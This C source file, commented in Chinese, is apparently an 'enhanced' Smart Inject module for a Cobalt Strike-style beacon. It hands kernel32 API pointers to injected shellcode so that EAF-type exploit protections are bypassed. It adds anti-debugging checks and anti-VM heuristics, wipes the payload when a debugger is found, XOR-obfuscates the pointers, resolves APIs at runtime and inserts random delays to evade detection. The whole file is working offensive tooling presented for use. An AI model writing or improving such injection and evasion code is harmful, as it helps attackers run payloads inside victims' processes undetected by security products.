/*
 * Smart Inject（智能注入）是一个在进行同架构进程注入时传播DLL指针的功能。
 * 这是一种避开EAF（执行应用程序防护）和使用类EAF技术检测shellcode
 * 进入进程的实时防护措施的方法。
 * 增强版本，具有改进的隐蔽性和安全功能。
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include <winternl.h>
#include "beacon.h"
#include "inject.h"
#include "commands.h"

/* 改进：添加更多API函数指针以增强功能 */
typedef struct {
    LPVOID pLoadLibraryA;
    LPVOID pGetProcAddress;
    LPVOID pVirtualAlloc;
    LPVOID pVirtualProtect;
    LPVOID pVirtualFree;        // 改进：添加内存释放
    LPVOID pGetModuleHandleA;   // 改进：添加模块句柄获取
    LPVOID pGetLastError;       // 改进：添加错误处理
    LPVOID pSleep;              // 改进：添加延迟功能
    LPVOID pCreateThread;       // 改进：添加线程创建
    LPVOID pWaitForSingleObject; // 改进：添加同步原语
    DWORD  timestamp;           // 改进：添加时间戳验证
    DWORD  processId;           // 改进：添加进程ID验证
    DWORD  check;
} SMARTINJECT;

/* 改进：增强头部检查结构 */
typedef struct {
    WORD  magic;
    WORD  version;              // 改进：添加版本号
    DWORD flags;                // 改进：添加特性标志
    char  padding[1010];        // 调整填充大小
    DWORD header;
} SMARTINJECTCHECK;

/* 改进：添加特性标志定义 */
#define SMARTINJECT_FLAG_ANTIDEBUG    0x00000001
#define SMARTINJECT_FLAG_ANTIVM       0x00000002  
#define SMARTINJECT_FLAG_OBFUSCATED   0x00000004
#define SMARTINJECT_FLAG_ENCRYPTED    0x00000008

/* 改进：添加版本控制 */
#define SMARTINJECT_VERSION_CURRENT   0x0002
#define SMARTINJECT_MAGIC             0x5A4D
#define SMARTINJECT_HEADER_MAGIC      0xF4F4F4F4

/* 改进：添加反调试检查 */
BOOL IsProcessBeingDebugged() {
    BOOL debuggerPresent = FALSE;
    
    // 检查PEB调试标志
    __asm {
        mov eax, fs:[0x30]      // 获取PEB
        mov al, [eax + 2]       // BeingDebugged标志
        mov debuggerPresent, al
    }
    
    // 检查调试器端口
    HANDLE hProcess = GetCurrentProcess();
    DWORD debugPort = 0;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessDebugPort, &debugPort, sizeof(debugPort), NULL);
    
    return debuggerPresent || (NT_SUCCESS(status) && debugPort != 0);
}

/* 改进：检查虚拟机环境 */
BOOL IsVirtualEnvironment() {
    // 检查CPU核心数
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    
    // 检查内存大小
    MEMORYSTATUSEX memStatus = {0};
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        // 小于2GB内存通常是虚拟机
        if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
            return TRUE;
        }
    }
    
    // 检查时间加速
    DWORD startTime = GetTickCount();
    Sleep(100);
    DWORD endTime = GetTickCount();
    if ((endTime - startTime) < 50) {  // 如果Sleep被加速
        return TRUE;
    }
    
    return FALSE;
}

/* 改进：动态API解析以避免静态检测 */
LPVOID GetDynamicAPI(const char* moduleName, const char* functionName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    if (!hModule) {
        hModule = LoadLibraryA(moduleName);
    }
    
    if (!hModule) {
        return NULL;
    }
    
    return GetProcAddress(hModule, functionName);
}

/* 改进：增强的Smart Inject检测 */
BOOL isSmartInject(char * buffer, int length) {
    SMARTINJECTCHECK * check;
    
    /* 改进：更严格的大小检查 */
    if (length < 51200 || length > (10 * 1024 * 1024)) {  // 最大10MB限制
        return FALSE;
    }

    /* 改进：边界检查 */
    if (!buffer || IsBadReadPtr(buffer, sizeof(SMARTINJECTCHECK))) {
        return FALSE;
    }

    /* cast our buffer to our header */
    check = (SMARTINJECTCHECK *)buffer;

    /* 改进：增强的头部验证 */
    if (check->magic != SMARTINJECT_MAGIC) {
        return FALSE;
    }
    
    if (check->header != SMARTINJECT_HEADER_MAGIC) {
        return FALSE;
    }
    
    /* 改进：版本检查 */
    if (check->version > SMARTINJECT_VERSION_CURRENT) {
        return FALSE;
    }

    return TRUE;
}

/* 改进：安全的内存写入 */
BOOL SecureMemoryWrite(LPVOID dest, const void* src, SIZE_T size) {
    DWORD oldProtect;
    
    if (!VirtualProtect(dest, size, PAGE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    __try {
        memcpy(dest, src, size);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualProtect(dest, size, oldProtect, &oldProtect);
        return FALSE;
    }
    
    VirtualProtect(dest, size, oldProtect, &oldProtect);
    return TRUE;
}

/* 改进：混淆API地址 */
LPVOID ObfuscatePointer(LPVOID ptr) {
    // 简单的XOR混淆，实际应用中可以使用更复杂的算法
    DWORD_PTR obfuscated = (DWORD_PTR)ptr;
    obfuscated ^= 0xDEADBEEF;
    obfuscated = (obfuscated << 16) | (obfuscated >> 16);  // 位旋转
    return (LPVOID)obfuscated;
}

/* 改进：反混淆API地址 */
LPVOID DeobfuscatePointer(LPVOID obfuscated) {
    DWORD_PTR ptr = (DWORD_PTR)obfuscated;
    ptr = (ptr << 16) | (ptr >> 16);  // 反向位旋转
    ptr ^= 0xDEADBEEF;
    return (LPVOID)ptr;
}

/* 改进：增强的Smart Inject设置 */
void SetupSmartInject(INJECTCONTEXT * context, char * buffer, int length) {
    SMARTINJECT * ptrs;
    SMARTINJECTCHECK * check;

    /* 改进：输入验证 */
    if (!context || !buffer || length <= 0) {
        return;
    }

    /* if we're not smart inject, do nothing */
    if (!isSmartInject(buffer, length)) {
        return;
    }

    /* check that we're the same arch! */
    if (!context->sameArch) {
        return;
    }

    /* 改进：反调试和反虚拟机检查 */
    check = (SMARTINJECTCHECK *)buffer;
    if (check->flags & SMARTINJECT_FLAG_ANTIDEBUG) {
        if (IsProcessBeingDebugged()) {
            // 如果检测到调试器，填充随机数据
            for (int i = 0; i < length; i += 4) {
                *(DWORD*)(buffer + i) = rand();
            }
            return;
        }
    }
    
    if (check->flags & SMARTINJECT_FLAG_ANTIVM) {
        if (IsVirtualEnvironment()) {
            // 在虚拟环境中执行无害操作
            Sleep(1000);
            return;
        }
    }

    /* we're located right at the end of the headers */
    ptrs = (SMARTINJECT *)((buffer + 1024) - sizeof(SMARTINJECT));

    /* 改进：边界检查 */
    if (IsBadWritePtr(ptrs, sizeof(SMARTINJECT))) {
        return;
    }

    /* 改进：随机延迟以避免检测 */
    Sleep(rand() % 100 + 50);

    /* setup our smart inject values with dynamic API resolution */
    ptrs->check = 0xF00D;
    ptrs->timestamp = GetTickCount();
    ptrs->processId = GetCurrentProcessId();
    
    /* 改进：使用动态API解析和混淆 */
    if (check->flags & SMARTINJECT_FLAG_OBFUSCATED) {
        ptrs->pGetProcAddress = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "GetProcAddress"));
        ptrs->pLoadLibraryA   = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "LoadLibraryA"));
        ptrs->pVirtualAlloc   = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "VirtualAlloc"));
        ptrs->pVirtualProtect = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "VirtualProtect"));
        ptrs->pVirtualFree    = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "VirtualFree"));
        ptrs->pGetModuleHandleA = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "GetModuleHandleA"));
        ptrs->pGetLastError   = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "GetLastError"));
        ptrs->pSleep          = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "Sleep"));
        ptrs->pCreateThread   = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "CreateThread"));
        ptrs->pWaitForSingleObject = ObfuscatePointer(GetDynamicAPI("kernel32.dll", "WaitForSingleObject"));
    } else {
        ptrs->pGetProcAddress = GetDynamicAPI("kernel32.dll", "GetProcAddress");
        ptrs->pLoadLibraryA   = GetDynamicAPI("kernel32.dll", "LoadLibraryA");
        ptrs->pVirtualAlloc   = GetDynamicAPI("kernel32.dll", "VirtualAlloc");
        ptrs->pVirtualProtect = GetDynamicAPI("kernel32.dll", "VirtualProtect");
        ptrs->pVirtualFree    = GetDynamicAPI("kernel32.dll", "VirtualFree");
        ptrs->pGetModuleHandleA = GetDynamicAPI("kernel32.dll", "GetModuleHandleA");
        ptrs->pGetLastError   = GetDynamicAPI("kernel32.dll", "GetLastError");
        ptrs->pSleep          = GetDynamicAPI("kernel32.dll", "Sleep");
        ptrs->pCreateThread   = GetDynamicAPI("kernel32.dll", "CreateThread");
        ptrs->pWaitForSingleObject = GetDynamicAPI("kernel32.dll", "WaitForSingleObject");
    }

    /* 改进：使用安全内存写入 */
    if (!SecureMemoryWrite(ptrs, ptrs, sizeof(SMARTINJECT))) {
        // 写入失败，清理敏感数据
        memset(ptrs, 0, sizeof(SMARTINJECT));
        return;
    }

    return;
}

/* 改进：添加Smart Inject验证函数 */
BOOL VerifySmartInject(char * buffer, int length, DWORD expectedProcessId) {
    SMARTINJECT * ptrs;
    
    if (!isSmartInject(buffer, length)) {
        return FALSE;
    }
    
    ptrs = (SMARTINJECT *)((buffer + 1024) - sizeof(SMARTINJECT));
    
    // 验证检查值
    if (ptrs->check != 0xF00D) {
        return FALSE;
    }
    
    // 验证进程ID
    if (ptrs->processId != expectedProcessId) {
        return FALSE;
    }
    
    // 验证时间戳（防止重放攻击）
    DWORD currentTime = GetTickCount();
    if (currentTime < ptrs->timestamp || (currentTime - ptrs->timestamp) > 300000) {  // 5分钟超时
        return FALSE;
    }
    
    return TRUE;
}

/* 改进：清理Smart Inject数据 */
void CleanupSmartInject(char * buffer, int length) {
    if (!isSmartInject(buffer, length)) {
        return;
    }
    
    SMARTINJECT * ptrs = (SMARTINJECT *)((buffer + 1024) - sizeof(SMARTINJECT));
    
    // 安全清零敏感数据
    SecureZeroMemory(ptrs, sizeof(SMARTINJECT));
}
